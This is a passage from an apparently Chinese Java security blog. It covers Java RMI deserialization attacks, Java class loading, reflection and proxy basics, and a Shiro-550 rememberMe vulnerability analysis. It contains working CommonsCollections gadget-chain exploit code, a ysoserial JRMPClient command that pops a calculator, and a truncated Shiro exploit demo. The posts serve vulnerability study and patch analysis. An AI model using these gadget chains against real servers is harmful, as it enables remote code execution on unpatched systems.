<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient1</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"open /Applications/Calculator.app"&#125;),</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Map ouputMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(ouputMap, <span class="string">"pwn"</span>);</span><br><span class="line">            BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>,<span class="number">1099</span>);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(<span class="string">"hello1"</span>);</span><br><span class="line">            System.out.println(hello.sayHello(badAttributeValueExpException));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (RemoteException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行客户端代码，会导致服务端反序列化，弹出计算器。</p>
<h2 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h2><p>客户端导致反序列化点有如下:</p>
<ul>
<li>接收到ransportConstants.ExceptionalReturn后，进行反序列化。</li>
<li>方法调用的返回值是一个恶意object，导致反序列化。</li>
</ul>
<p>对于第一点和1.2、2.2一样。对于第二点，直接修改服务端方法的返回值即可。</p>
<h1 id="DGC通讯方式"><a href="#DGC通讯方式" class="headerlink" title="DGC通讯方式"></a>DGC通讯方式</h1><p>除了以上容易想到的通信方式，还有DGC(分布式垃圾收集)，这是RMI框架用来管理远程对象生命周期的机制。可以通过与DGC通信的方式发送恶意的payload让注册中心反序列化。</p>
<p><font color=#EE7942>[客户端]</font>定位到<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>。<br><img src="27.png" alt=""></p>
<p>它的整个过程和前面lookup函数很像。可以看到它先新建了一个socket，然后经过一个过滤，将ObjID、var2以及Lease对象序列化到输出流中。然后执行UnicastRef.invoke函数。</p>
<p><font color=#43CD80>[注册中心]</font>定位到<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code>。case为1的地方。因为前面传输的为1。<br><img src="28.png" alt=""></p>
<p>可以看到，直接进行了反序列化操作，若传入的是恶意的object就可以RCE了。剩下的流程与客户端使用lookup与注册中心交互的流程一样。</p>
<h2 id="客户端攻击注册中心-JDK-lt-8u121-1"><a href="#客户端攻击注册中心-JDK-lt-8u121-1" class="headerlink" title="客户端攻击注册中心(JDK &lt; 8u121)"></a>客户端攻击注册中心(JDK &lt; 8u121)</h2><p>客户端如果通过DGC通信方式向注册中心发送恶意的obj，就会导致反序列化。</p>
<p>ysoserial工具中实现了这样的一个客户端<code>ysoserial.exploit.JRMPClient.java</code>。截取部分关键代码。</p>
<p><img src="29.png" alt=""></p>
<p>可以看到它使用DGC通信方式，且以dirty方法的方式。</p>
<h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><p>实际中只需要启动注册中心，然后启动JRMPClient就可。启动JRMPClient命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 &quot;open &#x2F;Applications&#x2F;Calculator.app&quot;</span><br></pre></td></tr></table></figure>

<p>即可在注册中心弹出计算器。</p>
<h3 id="补丁-3"><a href="#补丁-3" class="headerlink" title="补丁"></a>补丁</h3><p>JEP290同时也对DGC这种通信方式进行了反序列化类的过滤，定位到<code>DGCImpl#checkInput</code>。</p>
<p><img src="5-5.png" alt=""> </p>
<h2 id="注册中心攻击客户端-JDK-lt-8u232-b09"><a href="#注册中心攻击客户端-JDK-lt-8u232-b09" class="headerlink" title="注册中心攻击客户端(JDK&lt;8u232_b09)"></a>注册中心攻击客户端(JDK&lt;8u232_b09)</h2><p>注册中心攻击客户端的方法如上面一样。但是JDK8u232_b09之后，它无法接收到恶意的object。从而无法利用，还是上面其他方式攻击客户端更加适用。</p>
<h3 id="补丁-4"><a href="#补丁-4" class="headerlink" title="补丁"></a>补丁</h3><p>由于前面绕过JEP290的方式进行反向链接时使用的就是DGC通信方式，它在修复时，直接在发送/接收数据时，都会对数据进行一个过滤。导致无法利用。<br><img src="3-3.png" alt=""></p>
<p>在发送/接收时，会进行判断。</p>
<p><img src="4-4.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var1 !&#x3D; UID.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; VMID.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; Lease.class &amp;&amp; </span><br><span class="line">(var1.getPackage() &#x3D;&#x3D; null || !Throwable.class.isAssignableFrom(var1) || !&quot;java.lang&quot;.equals(var1.getPackage().getName()) &amp;&amp;</span><br><span class="line">!&quot;java.rmi&quot;.equals(var1.getPackage().getName())) &amp;&amp;</span><br><span class="line">var1 !&#x3D; StackTraceElement.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; ArrayList.class &amp;&amp; </span><br><span class="line">var1 !&#x3D; Object.class &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$UnmodifiableList&quot;) &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$UnmodifiableCollection&quot;) &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$UnmodifiableRandomAccessList&quot;) &amp;&amp; </span><br><span class="line">!var1.getName().equals(&quot;java.util.Collections$EmptyList&quot;) </span><br><span class="line">? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure>


<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从以上分析中可以看到，JRMP这种基于序列化数据传输协议使得RMI注册中心、客户端、服务端都能互相攻击。一般来说，服务端和注册中心在同一主机上。</p>
<p><strong>注册中心/服务端</strong>对<strong>客户端</strong>的攻击:  </p>
<ul>
<li>2.2/3.2/4.2: ExceptionReturn</li>
<li>5.2: ExceptionReturn<ul>
<li>JDK&lt;8u232_b09</li>
</ul>
</li>
</ul>
<p><strong>客户端</strong>对<strong>注册中心/服务端</strong>的攻击:</p>
<ul>
<li>2.1: bind操作<ul>
<li>JDK&lt;8u121</li>
</ul>
</li>
<li>2.3: JEP290绕过的bind操作<ul>
<li>JDK&lt;8u232_b09</li>
</ul>
</li>
<li>3.1: lookup操作<ul>
<li>JDK&lt;8u121</li>
</ul>
</li>
<li>4.1: Object参数</li>
<li>5.1: DGC通信<ul>
<li>JDK&lt;8u232_b09</li>
</ul>
</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">RMI-反序列化</a></li>
<li><a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">JAVA RMI 反序列化知识详解</a></li>
<li><a href="https://xz.aliyun.com/t/2223" target="_blank" rel="noopener">JAVA RMI 反序列化流程原理分析</a></li>
<li><a href="https://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/" target="_blank" rel="noopener">浅谈Java RMI Registry安全问题</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化有关基础知识</title>
    <url>/2020/04/29/java-basic/</url>
    <content><![CDATA[<p>这篇文章主要是记录在学习Java安全过程中需要用到的重要的知识点。</p>
<a id="more"></a>

<h1 id="Java类加载"><a href="#Java类加载" class="headerlink" title="Java类加载"></a>Java类加载</h1><p>Java虚拟机把描述类的数据从Class文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这就是虚拟机的加载机制。查找并加载类的虚拟机需要完成以下三件事情:</p>
<p>1) 通过一个类的全限定名称在获取定义此类的二进制字节流<br>2）将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构<br>3）在java堆中生成一个代表这个类的java.lang.Class对象，作为方法去这些数据的访问入口。  </p>
<blockquote>
<p>对于任何一个类，都需要由加载它的类加载器和这个类来确立其在JVM中的唯一ing。也就是说，两个类来源于同一个Class文件，并且被同一个类加载器加载，这两个类才相等。</p>
</blockquote>
<h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>当JVM启动时，会形成由3个类加载器组成的初始类加载器层次结构。</p>
<ul>
<li>Bootstrap ClassLoader: 根类加载器</li>
<li>Extension ClassLoader: 扩展类加载器</li>
<li>System ClassLoader: 系统类加载器</li>
</ul>
<p>自定义类加载器，只需要继承<code>java.lang.ClassLoader</code>类，并重写其<code>findClass()</code>方法即可。java.lang.ClassLoader类的基本职责就是根据一个指定的类的名称，找到或者生成其对应的字节码，然后从这些字节码中定义出一个Java类，即java.lang.Class类的一个实例。ClassLoader类中的相关方法如下:</p>
<ul>
<li>getParent()</li>
<li>loadClass()</li>
<li>findClass()</li>
<li>findLoadedClass()</li>
<li>resolveClass()</li>
<li>defineClass() 将字节码转换为Class对象</li>
</ul>
<h2 id="动态加载Jar"><a href="#动态加载Jar" class="headerlink" title="动态加载Jar"></a>动态加载Jar</h2><p>Java中动态加载jar的方式比较简单</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL[] urls = <span class="keyword">new</span> URL[]&#123;<span class="keyword">new</span> URL(<span class="string">"file:libs/jar1.jar"</span>)&#125;;</span><br><span class="line">URLClassloader loader = <span class="keyword">new</span> URLClassLoader(urls,parentLoader);</span><br></pre></td></tr></table></figure>

<h1 id="Javassit"><a href="#Javassit" class="headerlink" title="Javassit"></a>Javassit</h1><p>Javassist是一个Java库，提供了一种操作应用程序的<font color=#008000>Java字节码</font>的方法。Java字节码以二进制的形势存储在class文件中，每个class文件包含一个Java类或接口。</p>
<p>其中<font color=#008000>Javassist.CtClass</font>类表示class文件。如何获取一个CtClass类对象呢？</p>
<p>首先获取一个<font color=#008000>ClassPool</font>对象。它是CtClass对象的容器，按指定条件读取类文件来构造CtClass对象。</p>
<h2 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h2><p>ClassPool是一个存储CtClass的Hash表，类名为key,CtClass对象为value。</p>
<h3 id="获取搜索路径"><a href="#获取搜索路径" class="headerlink" title="获取搜索路径"></a>获取搜索路径</h3><p>ClassPool.getDfault()获取到的是JVM的类搜索路径。当存在tomcat这样的web服务时，它使用多个类加载器作为系统类加载器。在这种情况下，ClassPool需要添加额外的类搜索路径。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加入某个类的路径</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(<span class="keyword">this</span>.getClass()));</span><br><span class="line"></span><br><span class="line"><span class="comment">//加入目录</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(<span class="string">"/usr/local/javalib"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//加入URL</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> URLClassPath(<span class="string">"www.javassist.org"</span>,<span class="number">80</span>,<span class="string">"/java/"</span>,<span class="string">"org.javassist."</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//加入类的字节码以及类名</span></span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> ByteArrayClassPath(name,b));</span><br></pre></td></tr></table></figure>

<h3 id="获取CtClass对象"><a href="#获取CtClass对象" class="headerlink" title="获取CtClass对象"></a>获取CtClass对象</h3><p>1）使用<font color=#008000>get()</font>函数。可以从Hash表中查找对应的CtClass对象，若未找到则会创建并返回一个新的CtClass对象，将其保存在Hash表中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CtClass cc = pool.get(<span class="string">"test.Rectangle"</span>);</span><br></pre></td></tr></table></figure>

<p>2）使用<font color=#008000>makeClass()</font>函数。它可以返回从给定输入流构造的CtClass对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InputStream ins = an input stream <span class="keyword">for</span> reading a <span class="class"><span class="keyword">class</span> <span class="title">file</span></span>;</span><br><span class="line">CtClass cc = pool.makeClass(ins);</span><br></pre></td></tr></table></figure>

<h2 id="添加代码"><a href="#添加代码" class="headerlink" title="添加代码"></a>添加代码</h2><p>CtConstructor提供了<font color=#008000>insertBefore()</font>、<font color=#008000>insertAfter()</font>、<font color=#008000>addCatch()</font>方法。将Java编写的代码片段插入到现有的方法中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"xx"</span>;</span><br><span class="line">clazz.makeClassInitializer().insertAfter(cmd);</span><br></pre></td></tr></table></figure>




<h1 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h1><p>Class对象可以获得该类里的方法，构造器或者成员变量。</p>
<p>反射用来构造类的方式</p>
<ul>
<li>ClassLoader.loadClass()</li>
<li>Class.forName()</li>
</ul>
<p>获取Class对象的方法</p>
<ul>
<li>Class.forName()</li>
<li>.class</li>
<li>getClass()</li>
</ul>
<h1 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h1><p>熟悉Spring的一定知道AOP思想，AOP思想的原理就是Java的动态代理机制。<br>动态代理类主要涉及到两个类: <code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口。</p>
<h2 id="InvocationHandler接口"><a href="#InvocationHandler接口" class="headerlink" title="InvocationHandler接口"></a>InvocationHandler接口</h2><p>每一个动态代理类都必须实现InvocationHandler这个接口，并且每个代理类的实例都关联到了一个handler。当通过代理对象调用一个方法时，这个方法的调用就会被转发为由InvocationHandler这个接口的invoke方法来进行调用。在这个invoke方法中编写调用逻辑。</p>
<p>看看这个InvocationHandler接口唯一的方法invoke。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Object <span class="title">invoke</span><span class="params">(Object proxy, Method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//Porxy: 被代理的对象</span></span></span><br><span class="line"><span class="function"><span class="comment">//method: 被代理的对象的方法</span></span></span><br><span class="line"><span class="function"><span class="comment">//args: 调用被代理的对象的方法时接受的参数</span></span></span><br></pre></td></tr></table></figure>

<p><strong>举个例子</strong><br>在反序列化过程中，我们会遇到<code>AnnotationInvocationHandler</code>这个类，它实现了InvocationHandler这个类，来看看这个类的invoke方法</p>
<p><img src="1.png" alt=""></p>
<p>和上面的一样，事实上，它实例化出来的对象就是一个handler。</p>
<h2 id="Proxy类"><a href="#Proxy类" class="headerlink" title="Proxy类"></a>Proxy类</h2><p>有了动态代理类，那么如何将需要被代理的对象与这个动态代理类相关联呢？这里就要介绍到Proxy类了。Proxy类的作用是用来动态创建一个代理对象的类，其中用的最多的创建方法是<code>newProxyInstance</code>这个方法。来看看这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces,  InvocationHandler h)</span>  <span class="keyword">throws</span> IllegalArgumentException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//loader: 一个ClassLoader对象，定义了由哪个ClassLoader对象来对生成的代理对象进行加载</span></span></span><br><span class="line"><span class="function"><span class="comment">//interfaces: 一个Interface对象的数组，表示给需要代理的对象提供一组接口，从而使得代理对象实现了该接口(多态)，这样就能调用这组接口中的方法</span></span></span><br><span class="line"><span class="function"><span class="comment">//h: 一个InvocationHandler对象，表示当这个动态代理对象在调用方法时，会关联到哪个InvocationHandler对象上</span></span></span><br></pre></td></tr></table></figure>


<p>联想到<a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze-1/" target="_blank" rel="noopener">CommonsCollections1</a>中利用的动态代理机制，可以得知，目的是为了将LazyMap中的接口关联到AnnotationInvocationHandler类实例化的InvocationHandler对象上。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取LazyMap对象的ClassLoader对象</span></span><br><span class="line">Map lazymap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">ClassLoader classloader = lazymap.getClass().getClassLoader();</span><br><span class="line">Class[] interfaces = lazymap.getClass().getInterfaces();</span><br><span class="line"></span><br><span class="line"><span class="comment">//handler为实例化AnnotationInvocationHandler类的对象</span></span><br><span class="line">Map mapproxy = Proxy.newProxyInstance(classloader,interfaces,handler)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样就实现了在调用LazyMap的任何方法，都会转发到AnnotationInvocationHandler的invoke方法。从而实现了动态代理。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.jianshu.com/p/43424242846b" target="_blank" rel="noopener">Javassist 使用指南（一）</a></li>
<li><a href="https://www.jianshu.com/p/b9b3ff0e1bf8" target="_blank" rel="noopener">Javassist 使用指南（二）</a></li>
<li><a href="https://www.cnblogs.com/scy251147/p/11100961.html" target="_blank" rel="noopener">Javassist中文技术文档</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
  </entry>
  <entry>
    <title>shiro-550反序列化漏洞分析复现</title>
    <url>/2020/05/08/shiro-550-attack/</url>
    <content><![CDATA[<p>Apache shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，曝光了其1.2.4版本以前存在反序列化漏洞。该漏洞被称为shiro-550。</p>
<a id="more"></a>

<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>&lt;= 1.2.4</li>
</ul>
<h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>RememberMe</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>shiro默认的设置暴露了web应用的反序列化攻击。特别是考虑到最近使用的<font color=#008000>commons-collections</font>的利用。  </p>
<p>默认情况下，Apache Shiro框架使用<font color=#008000>CookieRememberMeManager</font>。它序列化、加密以及编码用户identity，以便之后的检索。因此，当它接收到来自未认证用户的请求时，它会寻找它们记住的identity，通过以下步骤:</p>
<ul>
<li>检索rememberMe cookie的值</li>
<li>Base64解码</li>
<li>使用AES解密</li>
<li>反序列化(ObjectInputStream)</li>
</ul>
<p>然而，默认加密的key是硬编码的，意味着任何可以获得源代码的人都知道默认加密密钥的值。因此，攻击者可以创建一个恶意的对象，序列化(在调用序列化时未进行任何的过滤)、编码，然后将其作为cookie发送。Shiro将解码并反序列化它，意味着现在恶意的对象已经存活在服务器上了。</p>
<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><h2 id="cookie生成过程"><a href="#cookie生成过程" class="headerlink" title="cookie生成过程"></a>cookie生成过程</h2><p>对于利用方式的分析，首先跟进一下Cookie的生成存储过程。Shiro框架的特征是登录页面的cookie中存在rememberMe的内容值。在登录时勾选上remmemberMe框。</p>
<p>首先在<code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code>处下断点。</p>
<p><img src="1.png" alt=""></p>
<p>首先会进入<code>forgetIndentity</code>，在这个函数里将在response添加一些cookie信息。接着，由于设置了<code>token.setRememberMe(true)</code>。将会进入<code>rememberIdentity(subject,token,info)</code>。</p>
<p><img src="2.png" alt=""></p>
<p>首先获得info的principals，然后进入<code>rememberIndentity(subject,principals)</code>。跟进它</p>
<p><img src="3.png" alt=""></p>
<p>首先调用convertPrincipalsToBytes, 跟进它。它首先会序列化principals，然后，会用CBC模式进行分组加密。</p>
<p><img src="4.png" alt=""></p>
<p>然后调用<code>rememberSerializedIdentity</code>函数。跟进这个函数，可以看到它首先将序列化加密后的principals进行base64加密，然后存入cookie中。整个过程和我们了解到的一样，先<font color=#008000>序列化</font>，然后进行<font color=#008000>AES加密</font>，最后进行<font color=#008000>Base64加密</font>。</p>
<h2 id="cookie的反序列化过程"><a href="#cookie的反序列化过程" class="headerlink" title="cookie的反序列化过程"></a>cookie的反序列化过程</h2><p>首先来看看整个的调用链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DefaultSecurityManager.createSubject()</span><br><span class="line">  -&gt;DefaultSecurityManager.resolvePrincipals()</span><br><span class="line">    -&gt;DefaultSecurityManager.getRememberedIdentity()</span><br><span class="line">      -&gt;AbstractRememberMeManager.getRememberedPrincipals()</span><br><span class="line">        -&gt;</span><br></pre></td></tr></table></figure>

<p>前面了解到了cookie生成的整个过程，接下来看看它的反序列化过程。选择了在<code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code>这个位置下断点。其调用链如下所示</p>
<p><img src="5.png" alt=""></p>
<p>因为是从<code>SecurityManager</code>开始，然后开始进行相关的身份校验。往上走一步，定位到<code>getRememberedPrincipals</code>函数。</p>
<p><img src="6.png" alt=""></p>
<p>它首先会调用getRememberedSerializedIdentity函数，跟进它。</p>
<p><img src="7.png" alt=""></p>
<p>它会获取到http请求中的cookie值，然后将其进行base64解码并返回解码后的值。</p>
<p>然后跟进<code>convertBytesToPrincipals</code>函数。</p>
<p><img src="8.png" alt=""></p>
<p>它会先将其进行解密然后进行反序列化。首先decrypt函数会讲其进行解密。然后调用<code>deserialize</code>函数来处理解密后的内容。</p>
<p><img src="9.png" alt=""></p>
<p>跟进它。</p>
<p><img src="10.png" alt=""></p>
<p>继续跟进<code>this.getSerializer().deserialize</code>函数</p>
<p><img src="11.png" alt=""></p>
<p>这里进入到了DefaultSerializer.deserialize函数，这个函数里看到了熟悉的readObject函数。</p>
<p><img src="12.png" alt=""></p>
<p>到这里整个反序列化过程的分析就结束了。接下来看看如何利用吧！</p>
<h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><p>在大多数直接利用的版本中，发现shiro自带的commons-collections的版本是3.2.1，从前面针对commons-collections的<a href="https://ananaskr.github.io/2020/04/29/ysoserial-cc-sumary/" target="_blank" rel="noopener">总结</a>可以知道，CommonsCollections1，3，5，6，7，9，10都可以利用。  </p>
<p>然而在实际利用时，会发现无法直接利用shiro自带的commons-collections:3.2.1。从@orange和@zsx文章中，可以得知。<font color=#008000>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，ClassLoader.loadClass不支持装载数组类型的class</font>。</p>
<p>让我们来分析分析这一过程。在前面分析到deserialize函数时，会发现</p>
<p><img src="13.png" alt=""></p>
<p>在第49行使用的是<code>ClassResolvingObjectInputStream</code>而不是传统的<code>ObjectInputStream</code>。跟进它，</p>
<p><img src="14.png" alt=""></p>
<p>可以看到它重写了ObjectInputStream的resolveClass函数。与下面这个传统的resolveClass相比，它使用的是<code>ClassUtils.forName()</code>。</p>
<p><img src="15.png" alt=""></p>
<p>跟进<code>ClassUtils.forName()</code>函数。</p>
<p><img src="16.png" alt=""></p>
<p>可以看到，它使用的是线程上下文加载器，它获取到的当前加载器是<code>ParallelWebappClassLoader</code>，其loadClass方法是继承自父类<code>WebappClassLoader</code>。会按照以下方式进行加载。</p>
<p><img src="17.png" alt=""></p>
<p>根据流程，<code>ParallelWebappClassLoader</code>会先寻找内部缓存，若找不到则交给URLClassLoader。在对于path为<code>/Lorg/apache/commons/collections/Transformer;.class</code>的情况下，是找不到的。所以，导致ClassNotFound。</p>
<p>因此，在利用链中不能包含数组，即在之前分析的命令执行点，不能使用ChainedTransformer这个类。因为这个类的成员变量是一个数组。而之前分析的CommonsCollections利用链中，有提到利用InvokerTransformer的transform方法来调用newTransformer。之前的介绍中有利用LazyMap.get()来触发transform。<a href="https://www.anquanke.com/post/id/192619" target="_blank" rel="noopener">wh1t3p1g</a>也介绍了这种方式，结合了CommonsCollections5，6，9利用链，所以在这里就不再赘述了。直接来看看整个利用链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">  -&gt;HashMap.put()</span><br><span class="line">    -&gt;HashMap.hash()</span><br><span class="line">      -&gt;TiedMapEntry.hashCode()</span><br><span class="line">        -&gt;TiedMapEntry.getValue()</span><br><span class="line">          -&gt;LazyMap.get()</span><br><span class="line">            -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<p>完整的demo如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span 